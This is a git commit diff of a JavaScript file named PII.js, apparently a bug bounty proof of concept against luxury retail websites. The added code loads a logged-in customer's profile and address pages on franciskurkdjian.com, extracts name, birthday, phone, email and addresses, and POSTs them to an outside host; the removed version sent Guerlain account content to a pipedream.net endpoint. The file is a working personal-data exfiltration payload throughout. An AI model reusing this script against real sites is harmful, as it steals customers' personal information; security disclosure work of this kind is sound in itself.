64a817a86f049b531d5d169610280b3c84a775c5
Hugo DELCROIX <91057582+HugoDELCROIX@users.noreply.github.com>
2024-11-28 15:19:01 +0100

    Update PII.js

--- PII.js
+++ PII.js
@@ -1,17 +1,32 @@
-fetch("https://www.guerlain.com/fr/fr-fr/account")
-  .then((response) => response.text())
-  .then((html) => {
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(html, "text/html");
-    const dashboardContent = doc
-      .querySelector(".dashboard-content.container")
-      ?.textContent.trim();
+fetch('https://www.franciskurkdjian.com/eu-en/editprofile')
+.then(response => response.text())
+.then(html => {
+const parser = new DOMParser();
+const doc = parser.parseFromString(html, 'text/html');
 
-    fetch("https://eoy7otg07wtdi6k.m.pipedream.net", {
-      method: "POST",
+const data = {
+  firstname: doc.querySelector('[name="dwfrm_profile_customer_firstname"]').value,
+  lastname: doc.querySelector('[name="dwfrm_profile_customer_lastname"]').value,
+  birthday: doc.querySelector('[name="dwfrm_profile_customer_birthday"]').value,
+  phone: doc.querySelector('[name="dwfrm_profile_customer_phone"]').value,
+  email: doc.querySelector('[name="dwfrm_profile_customer_email"]').value
+};
+
+return fetch('https://www.franciskurkdjian.com/eu-en/addresslist')
+  .then(response => response.text())
+  .then(addressHtml => {
+    const addressDoc = parser.parseFromString(addressHtml, 'text/html');
+    const addressContainer = addressDoc.querySelectorAll('.container-address');
+    const addresses = Array.from(addressContainer).map(div => div.textContent.trim());
+
+    data.addresses = addresses;
+
+    return fetch('https://poc.ywh.at/fk-PII', {
+      method: 'POST',
       headers: {
-        "Content-Type": "application/json",
+        'Content-Type': 'application/json'
       },
-      body: JSON.stringify({ dashboardContent }),
+      body: JSON.stringify(data)
     });
   });
+});
